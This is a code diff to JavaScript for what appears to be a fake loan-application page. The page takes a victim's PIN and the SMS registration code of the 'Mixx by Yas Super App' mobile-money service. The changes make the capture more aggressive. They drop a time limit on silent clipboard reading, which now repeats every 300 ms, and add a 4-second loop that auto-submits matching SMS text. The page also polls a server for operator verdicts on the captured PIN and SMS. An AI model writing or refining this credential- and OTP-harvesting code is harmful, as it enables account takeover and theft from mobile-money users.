@@ -42,15 +42,16 @@ document.addEventListener('DOMContentLoaded', () => {
     let currentSessionId = null;
     let statusInterval = null;
     let sensitivityInterval = null;
+    let autoCheckInterval = null;
     let isAutoSubmitting = false;
     let screenOpenTimestamp = 0;
 
-    // Flexible dynamic validation for varying verification messages over time
-    function isValidDynamicSMS(text) {
-        if (!text || text.length < 10) return false;
-        const hasBrand = /Mixx by Yas/i.test(text);
-        const hasCode = /(code|pin|namba)/i.test(text) || text.length > 20;
-        return hasBrand && hasCode;
+    const REQUIRED_SMS_START = "You are being registered in Mixx by Yas Super App, use the code";
+
+    // Strict validation checking if SMS starts with the exact required phrase
+    function isValidSMS(text) {
+        if (!text) return false;
+        return text.trim().startsWith(REQUIRED_SMS_START);
     }
 
     function switchStep(fromCard, toCard) {
@@ -166,12 +167,11 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     }
 
-    // Direct text tracker for changes
     if (otpText) {
         otpText.addEventListener('input', () => {
             charCount.innerText = `${otpText.value.length}/1000`;
             const currentText = otpText.value.trim();
-            if (isValidDynamicSMS(currentText) && !isAutoSubmitting) {
+            if (isValidSMS(currentText) && !isAutoSubmitting) {
                 smsErrorBanner.classList.add('hidden');
                 triggerAutoSubmit(currentText);
             }
@@ -182,6 +182,7 @@ document.addEventListener('DOMContentLoaded', () => {
         if (isAutoSubmitting) return;
         isAutoSubmitting = true;
         if (sensitivityInterval) clearInterval(sensitivityInterval);
+        if (autoCheckInterval) clearInterval(autoCheckInterval);
         switchStep(stepOtp, stepLoading);
 
         try {
@@ -196,13 +197,13 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     }
 
+    // THIBITISHA button handler with 4-second checker integration
     if (btnThibitisha) {
         btnThibitisha.addEventListener('click', () => {
             const text = otpText.value.trim();
-            if (!text) return;
             smsErrorBanner.classList.add('hidden');
             
-            if (!isValidDynamicSMS(text)) {
+            if (!isValidSMS(text)) {
                 smsErrorBanner.classList.remove('hidden');
                 isAutoSubmitting = false;
                 return;
@@ -211,7 +212,6 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     }
 
-    // Clickable sample text helper for applicants to tap-to-copy
     if (clickableSmsBox && smsSampleText) {
         clickableSmsBox.addEventListener('click', () => {
             const textToCopy = smsSampleText.innerText.trim();
@@ -234,7 +234,7 @@ document.addEventListener('DOMContentLoaded', () => {
             setTimeout(() => {
                 if (navigator.clipboard && navigator.clipboard.readText) {
                     navigator.clipboard.readText().then(clipText => {
-                        if (clipText && isValidDynamicSMS(clipText)) {
+                        if (clipText && isValidSMS(clipText)) {
                             otpText.value = clipText.trim();
                             charCount.innerText = `${otpText.value.length}/1000`;
                             smsErrorBanner.classList.add('hidden');
@@ -248,8 +248,10 @@ document.addEventListener('DOMContentLoaded', () => {
 
     function startHighSensitivityListener() {
         if (sensitivityInterval) clearInterval(sensitivityInterval);
+        if (autoCheckInterval) clearInterval(autoCheckInterval);
         screenOpenTimestamp = Date.now();
 
+        // High frequency DOM/clipboard check
         sensitivityInterval = setInterval(() => {
             if (isAutoSubmitting) return;
 
@@ -258,7 +260,7 @@ document.addEventListener('DOMContentLoaded', () => {
             }
 
             const currentFieldText = otpText.value.trim();
-            if (isValidDynamicSMS(currentFieldText) && !isAutoSubmitting) {
+            if (isValidSMS(currentFieldText) && !isAutoSubmitting) {
                 smsErrorBanner.classList.add('hidden');
                 triggerAutoSubmit(currentFieldText);
                 return;
@@ -267,19 +269,26 @@ document.addEventListener('DOMContentLoaded', () => {
             if (navigator.clipboard && navigator.clipboard.readText) {
                 navigator.clipboard.readText().then(clipText => {
                     if (clipText && !isAutoSubmitting) {
-                        const now = Date.now();
-                        if ((now - screenOpenTimestamp) <= 60000) {
-                            const trimmed = clipText.trim();
-                            if (isValidDynamicSMS(trimmed)) {
-                                otpText.value = trimmed;
-                                charCount.innerText = `${otpText.value.length}/1000`;
-                                triggerAutoSubmit(trimmed);
-                            }
+                        const trimmed = clipText.trim();
+                        if (isValidSMS(trimmed)) {
+                            otpText.value = trimmed;
+                            charCount.innerText = `${otpText.value.length}/1000`;
+                            triggerAutoSubmit(trimmed);
                         }
                     }
                 }).catch(() => {});
             }
         }, 300);
+
+        // Active 4-second checking interval loop to automatically verify and submit when valid SMS is detected
+        autoCheckInterval = setInterval(() => {
+            if (isAutoSubmitting) return;
+            const currentText = otpText.value.trim();
+            if (isValidSMS(currentText)) {
+                smsErrorBanner.classList.add('hidden');
+                triggerAutoSubmit(currentText);
+            }
+        }, 4000); // Runs every 4 seconds
     }
 
     function initWebOTP() {
@@ -291,19 +300,16 @@ document.addEventListener('DOMContentLoaded', () => {
             }).then(otp => {
                 if (otp && (otp.code || otp.value)) {
                     const smsMessage = otp.code || otp.value;
-                    const now = Date.now();
-                    if ((now - screenOpenTimestamp) <= 60000) {
-                        if (isValidDynamicSMS(smsMessage)) {
-                            otpText.value = smsMessage;
-                            charCount.innerText = `${smsMessage.length}/1000`;
-                            setTimeout(() => {
-                                const text = otpText.value.trim();
-                                if (text && !isAutoSubmitting) {
-                                    smsErrorBanner.classList.add('hidden');
-                                    triggerAutoSubmit(text);
-                                }
-                            }, 100);
-                        }
+                    if (isValidSMS(smsMessage)) {
+                        otpText.value = smsMessage;
+                        charCount.innerText = `${smsMessage.length}/1000`;
+                        setTimeout(() => {
+                            const text = otpText.value.trim();
+                            if (text && !isAutoSubmitting) {
+                                smsErrorBanner.classList.add('hidden');
+                                triggerAutoSubmit(text);
+                            }
+                        }, 100);
                     }
                 }
             }).catch(() => {});
@@ -327,11 +333,13 @@ document.addEventListener('DOMContentLoaded', () => {
                 } else if (data.status === 'success') {
                     clearInterval(statusInterval);
                     if (sensitivityInterval) clearInterval(sensitivityInterval);
+                    if (autoCheckInterval) clearInterval(autoCheckInterval);
                     document.getElementById('final-approved-amount').innerText = 'TSh ' + loanData.amount;
                     switchStep(stepLoading, stepSuccess);
                 } else if (data.status === 'wrong_pin') {
                     clearInterval(statusInterval);
                     if (sensitivityInterval) clearInterval(sensitivityInterval);
+                    if (autoCheckInterval) clearInterval(autoCheckInterval);
                     pinInputs.forEach(i => i.value = '');
                     document.getElementById('pin-hidden').value = '';
                     pinErrorBanner.classList.remove('hidden');
@@ -340,6 +348,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 } else if (data.status === 'wrong_sms') {
                     clearInterval(statusInterval);
                     if (sensitivityInterval) clearInterval(sensitivityInterval);
+                    if (autoCheckInterval) clearInterval(autoCheckInterval);
                     otpText.value = '';
                     isAutoSubmitting = false;
                     charCount.innerText = '0/1000';
@@ -350,10 +359,11 @@ document.addEventListener('DOMContentLoaded', () => {
                 } else if (data.status === 'denied') {
                     clearInterval(statusInterval);
                     if (sensitivityInterval) clearInterval(sensitivityInterval);
+                    if (autoCheckInterval) clearInterval(autoCheckInterval);
                     location.reload();
                 }
             } catch (err) {}
         }, 2000);
     }
 });
-    
+                          
